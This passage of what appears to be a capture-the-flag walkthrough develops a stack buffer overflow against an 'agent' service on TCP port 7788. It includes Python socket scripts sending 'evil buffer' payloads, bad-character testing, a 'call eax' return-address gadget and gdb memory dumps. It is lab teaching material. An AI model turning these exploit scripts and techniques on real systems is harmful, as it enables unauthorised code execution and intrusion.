    <div>0xffffd114:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd124:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd134:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd144:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd154:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd164:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd174:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd184:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd194:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd1a4:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd1b4:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd1c4:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd1d4:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd1e4:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd1f4:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd204:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
</div>
<div><br /></div>
<div>The next step will be to check to see if there are any bad characters. We need to be able to send a bunch of hex characters to the program, so we won't be able to do that interactively. What I'll do is use netcat to have the program listen on a port on my attacking machine, then use a python script to connect to it and send the bad characters. I'll also need to have my debugger attach to the agent process (after the python script connects) so we can check the registers after the crash. To give me some time to attach the debugger, I'll add a 'sleep' to my python script. Going ahead and setting this script up will be good because we'll use the same process to connect to and overflow the process running on our victim (on TCP port 7788). Here's what the final product looks like.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# cat sock-badchars.py </div>
    <div>#!/usr/bin/python</div>
    <div>import socket</div>
    <div>import time</div>
    <div><br /></div>
    <div>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div>
    <div>
        <div><br /></div>
    </div>
    <div>badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</div>
    <div>"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</div>
    <div>"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</div>
    <div>"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</div>
    <div>"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</div>
    <div>"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</div>
    <div>"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</div>
    <div>"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")</div>
    <div>
        <div><br /></div>
    </div>
    <div># bad chars</div>
    <div># \x00\x0a</div>
    <div>
        <div><br /></div>
    </div>
    <div>buffer = "A"*168 + "B"*4 + badchars</div>
    <div>
        <div><br /></div>
    </div>
    <div>try:</div>
    <div>Â Â print "Sending evil buffer..."</div>
    <div>Â Â s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div>
    <div>Â Â s.settimeout(2)</div>
    <div>Â Â s.connect(('10.183.0.222',7788))</div>
    <div>Â Â s.recv(1024)</div>
    <div>Â Â time.sleep(10)</div>
    <div>Â Â s.send('48093572' + '\n')</div>
    <div>Â Â s.recv(1024)</div>
    <div>Â Â s.send('3' + '\n')</div>
    <div>Â Â s.send(buffer + '\n')</div>
    <div>Â Â print "Done!"</div>
    <div>except:</div>
    <div>Â Â print "Could not connect to TCP port 7788"</div>
</div>
<div><br /></div>
<div>You might can see I have '\x00' and '\x0a' identified as bad characters. I didn't even try to send '\x00' (the NULL character), but I was able to determine '\x0a' was a bad character by doing the following...</div>
<div><br /></div>
<div>Start a netcat listener with the agent binary...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# nc -ve agent -lp 7788</div>
    <div>listening on [any] 7788 ...</div>
</div>
<div><br /></div>
<div>Start my python script that sends bad characters...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# python sock-badchars.py</div>
    <div>Sending evil buffer...</div>
</div>
<div><br /></div>
<div>Start my debugger (attached to the agent process)...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# gdb -q attach $(pgrep agent) -ex continue</div>
    <div>attach: No such file or directory.</div>
    <div>Attaching to process 461</div>
    <div>Reading symbols from /root/Walkthroughs/imf/agent...(no debugging symbols found)...done.</div>
    <div>Reading symbols from /lib/i386-linux-gnu/libc.so.6...(no debugging symbols found)...done.</div>
    <div>Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.</div>
    <div>0xf7eda079 in __kernel_vsyscall ()</div>
    <div>Continuing.</div>
</div>
<div><br /></div>
<div>Then I wait a few seconds for my timeout to complete... once it finishes sending the bad characters, I can check the eax register to see if/where any bad characters might have broken things.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>Program received signal SIGSEGV, Segmentation fault.</div>
    <div>0x42424242 in ?? ()</div>
    <div>(gdb) x/100x $eax</div>
    <div>0xfff52ab4:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xfff52ac4:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xfff52ad4:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xfff52ae4:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xfff52af4:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xfff52b04:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xfff52b14:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xfff52b24:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xfff52b34:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xfff52b44:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0xfff52ab4Â Â Â Â Â Â 0x41414141</div>
    <div>0xfff52b54:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x42424242Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x04030201</font>
    </div>
    <div>0xfff52b64:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x08070605</font>Â Â Â Â Â Â 0x0967<font style="color: rgb(255, 38, 0); --inversion-type-color: simple;">00</font><font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">09</font>Â Â Â Â Â Â 0x383489bbÂ Â Â Â Â Â 0x35333930
    </div>
    <div>0xfff52b74:Â Â Â Â Â 0xff003237Â Â Â Â Â Â 0x00000003Â Â Â Â Â Â 0x0a048991Â Â Â Â Â Â 0xf7eeb560</div>
    <div>0xfff52b84:Â Â Â Â Â 0xfff52ba0Â Â Â Â Â Â 0x00000000Â Â Â Â Â Â 0xf7ce8b41Â Â Â Â Â Â 0xf7ea8000</div>
    <div>0xfff52b94:Â Â Â Â Â 0xf7ea8000Â Â Â Â Â Â 0x00000000Â Â Â Â Â Â 0xf7ce8b41Â Â Â Â Â Â 0x00000001</div>
    <div>0xfff52ba4:Â Â Â Â Â 0xfff52c34Â Â Â Â Â Â 0xfff52c3cÂ Â Â Â Â Â 0xfff52bc4Â Â Â Â Â Â 0x00000001</div>
    <div>0xfff52bb4:Â Â Â Â Â 0x00000000Â Â Â Â Â Â 0xf7ea8000Â Â Â Â Â Â 0xffffffffÂ Â Â Â Â Â 0xf7f04000</div>
    <div>0xfff52bc4:Â Â Â Â Â 0x00000000Â Â Â Â Â Â 0xf7ea8000Â Â Â Â Â Â 0xf7ea8000Â Â Â Â Â Â 0x00000000</div>
    <div>0xfff52bd4:Â Â Â Â Â 0xc8a902b7Â Â Â Â Â Â 0xbfe844a7Â Â Â Â Â Â 0x00000000Â Â Â Â Â Â 0x00000000</div>
    <div>0xfff52be4:Â Â Â Â Â 0x00000000Â Â Â Â Â Â 0x00000001Â Â Â Â Â Â 0x08048500Â Â Â Â Â Â 0x00000000</div>
    <div>0xfff52bf4:Â Â Â Â Â 0xf7ef06d0Â Â Â Â Â Â 0xf7eeb560Â Â Â Â Â Â 0xf7f04000Â Â Â Â Â Â 0x00000001</div>
    <div>0xfff52c04:Â Â Â Â Â 0x08048500Â Â Â Â Â Â 0x00000000Â Â Â Â Â Â 0x08048521Â Â Â Â Â Â 0x080485fb</div>
    <div>0xfff52c14:Â Â Â Â Â 0x00000001Â Â Â Â Â Â 0xfff52c34Â Â Â Â Â Â 0x08048970Â Â Â Â Â Â 0x080489d0</div>
    <div>0xfff52c24:Â Â Â Â Â 0xf7eeb560Â Â Â Â Â Â 0xfff52c2cÂ Â Â Â Â Â 0xf7f04950Â Â Â Â Â Â 0x00000001</div>
    <div>0xfff52c34:Â Â Â Â Â 0xfff5429eÂ Â Â Â Â Â 0x00000000Â Â Â Â Â Â 0xfff542a4Â Â Â Â Â Â 0xfff542b4</div>
</div>
<div><br /></div>
<div>Following the values, after our 'B's (0x42424242) you can see \x01-\x09 worked fine, but then \x0a did not make it. Knowing this, we go back to our python script, remove \x0a from our list of bad characters and start the process again. In our case, when we ran the process again and checked the stack, all our other bad characters made it through.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>(gdb) x/124x 0xffa5aec4</div>
    <div>0xffa5aec4:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffa5aed4:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffa5aee4:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffa5aef4:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffa5af04:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffa5af14:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffa5af24:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffa5af34:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffa5af44:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffa5af54:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0xffa5aec4Â Â Â Â Â Â 0x41414141</div>
    <div>0xffa5af64:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x42424242Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x04030201</font>
    </div>
    <div>0xffa5af74:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x08070605</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x0d0c0b09</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x11100f0e</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x15141312</font>
    </div>
    <div>0xffa5af84:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x19181716</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x1d1c1b1a</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x21201f1e</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x25242322</font>
    </div>
    <div>0xffa5af94:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x29282726</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x2d2c2b2a</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x31302f2e</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x35343332</font>
    </div>
    <div>0xffa5afa4:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x39383736</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x3d3c3b3a</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x41403f3e</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x45444342</font>
    </div>
    <div>0xffa5afb4:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x49484746</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x4d4c4b4a</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x51504f4e</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x55545352</font>
    </div>
    <div>0xffa5afc4:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x59585756</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x5d5c5b5a</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x61605f5e</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x65646362</font>
    </div>
    <div>0xffa5afd4:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x69686766</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x6d6c6b6a</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x71706f6e</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x75747372</font>
    </div>
    <div>0xffa5afe4:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x79787776</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x7d7c7b7a</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x81807f7e</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x85848382</font>
    </div>
    <div>0xffa5aff4:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x89888786</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x8d8c8b8a</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x91908f8e</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x95949392</font>
    </div>
    <div>0xffa5b004:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x99989796</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x9d9c9b9a</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0xa1a09f9e</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0xa5a4a3a2</font>
    </div>
    <div>0xffa5b014:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xa9a8a7a6</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0xadacabaa</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0xb1b0afae</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0xb5b4b3b2</font>
    </div>
    <div>0xffa5b024:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xb9b8b7b6</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0xbdbcbbba</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0xc1c0bfbe</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0xc5c4c3c2</font>
    </div>
    <div>0xffa5b034:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xc9c8c7c6</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0xcdcccbca</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0xd1d0cfce</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0xd5d4d3d2</font>
    </div>
    <div>0xffa5b044:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xd9d8d7d6</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0xdddcdbda</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0xe1e0dfde</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0xe5e4e3e2</font>
    </div>
    <div>0xffa5b054:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xe9e8e7e6</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xedecebea</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xf1f0efee</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xf5f4f3f2</font>
    </div>
    <div>0xffa5b064:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xf9f8f7f6</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xfdfcfbfa</font>Â Â Â Â Â Â 0xff00<font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">fffe</font>Â Â Â Â Â Â 0xffa5be46</div>
    <div>0xffa5b074:Â Â Â Â Â 0xffa5be78Â Â Â Â Â Â 0xffa5be8fÂ Â Â Â Â Â 0xffa5beaaÂ Â Â Â Â Â 0xffa5beb4</div>
    <div>0xffa5b084:Â Â Â Â Â 0xffa5bebcÂ Â Â Â Â Â 0xffa5becfÂ Â Â Â Â Â 0xffa5beebÂ Â Â Â Â Â 0xffa5bf0c</div>
    <div>0xffa5b094:Â Â Â Â Â 0xffa5bf62Â Â Â Â Â Â 0xffa5bf70Â Â Â Â Â Â 0xffa5bfa3Â Â Â Â Â Â 0xffa5bfb7</div>
    <div>0xffa5b0a4:Â Â Â Â Â 0xffa5bfcaÂ Â Â Â Â Â 0xffa5bfe4Â Â Â Â Â Â 0x00000000Â Â Â Â Â Â 0x00000020</div>
</div>
<div><br /></div>
<div>Now we need to see if our program has a jmp or call to the esp or eax register. If we can jump/call eax, we will put our shell code where the 'A's are. If we can jmp/call esp, we will put our shell code where the 'C's are. We have a lot more room to work with in the esp register, so we'll check that one first.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# objdump -D agent | grep -P 'jmp|call' | grep -i esp</div>
    <div>root@kali:~/Walkthroughs/imf# objdump -D agent | grep -P 'jmp|call' | grep -i eax</div>
    <div> 8048563:Â Â Â Â Â Â Â ff d0Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â callÂ Â Â *%eax</div>
    <div> 8048e4f:Â Â Â Â Â Â Â ff 94 00 00 00 00 41Â Â Â Â callÂ Â Â *0x41000000(%eax,%eax,1)</div>
    <div> 8048eaf:Â Â Â Â Â Â Â ff 60 00Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â jmpÂ Â Â Â *0x0(%eax)</div>
</div>
<div><br /></div>
<div>OK. Looks like we have a call to eax at 0x08048563, but none to esp. If we do some hex math on the memory addresses from the start of our eax register to where we hit that random 4 bytes earlier, we have 152 bytes for our shell code. Thankfully our shell code should only be about 90 to 100 bytes, so we should be ok.</div>
<div><br /></div>
<div>We'll use our netcat listener + python script + gdb debugger to test the call command. If this works, we'll be ready to set up our payload.</div>
<div><br /></div>
<div>Here's the script we created to check the 'call eax' command...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# cat sock-check-eax.py </div>
    <div>#!/usr/bin/python</div>
    <div>import socket</div>
    <div>import time</div>
    <div><br /></div>
    <div>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div>
    <div>
        <div><br /></div>
    </div>
    <div># bad chars</div>
    <div># \x00\x0a</div>
    <div>
        <div><br /></div>
    </div>
    <div># CALL EAX address = 0x08048563 = \x08\x04\x85\x63</div>
    <div># Because of Little Endian, we need to reverse the address to \x63\x85\x04\x08</div>
    <div>call_eax = "\x63\x85\x04\x08"</div>
    <div>
        <div><br /></div>
    </div>
    <div>buffer = "A"*168 + call_eax</div>
    <div>
        <div><br /></div>
    </div>
    <div>try:</div>
    <div>Â Â print "Sending evil buffer..."</div>
    <div>Â Â s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div>
    <div>Â Â s.settimeout(2)</div>
    <div>Â Â s.connect(('10.183.0.222',7788))</div>
    <div>Â Â s.recv(1024)</div>
    <div>Â Â time.sleep(10)</div>
    <div>Â Â s.send('48093572' + '\n')</div>
    <div>Â Â s.recv(1024)</div>
    <div>Â Â s.send('3' + '\n')</div>
    <div>Â Â s.send(buffer + '\n')</div>
    <div>Â Â print "Done!"</div>
    <div>except:</div>
    <div>Â Â print "Could not connect to TCP port 7788"</div>
</div>
<div><br /></div>
<div>And here is what we found in the debugger...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>Program received signal SIGSEGV, Segmentation fault.</div>
    <div>0xffde7e8c in ?? ()</div>
    <div>(gdb) x/24x 0xffde7e8c</div>
    <div>0xffde7e8c:Â Â Â Â Â <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">0xffde7df4</font>Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffde7e9c:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x08048565</font>Â Â Â Â Â Â 0xf7f12300Â Â Â Â Â Â 0x00040000Â Â Â Â Â Â 0x08ce51d0</div>
    <div>0xffde7eac:Â Â Â Â Â 0x383489bbÂ Â Â Â Â Â 0x35333930Â Â Â Â Â Â 0xff003237Â Â Â Â Â Â 0x00000003</div>
